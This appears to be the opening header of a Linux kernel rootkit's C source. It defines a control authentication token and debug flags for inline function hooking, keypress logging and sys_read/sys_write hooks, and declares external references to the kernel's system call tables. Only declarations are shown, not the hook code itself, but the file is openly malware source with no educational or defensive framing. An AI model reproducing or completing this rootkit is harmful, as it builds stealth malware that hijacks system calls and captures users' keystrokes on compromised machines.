#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>

#define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
#define __DEBUG__ 1             // General debugging statements
#define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
#define __DEBUG_KEY__ 1         // Debugging of user keypresses
#define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks

extern unsigned long *sys_call_table;

char *strnstr ( const char *haystack, const char *needle, size_t n );
void *memmem ( const void *haystack, size_t haystack_size, const void *needle, size_t needle_size );
void *memstr ( const void *haystack, const char *needle, size_t size );

#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif


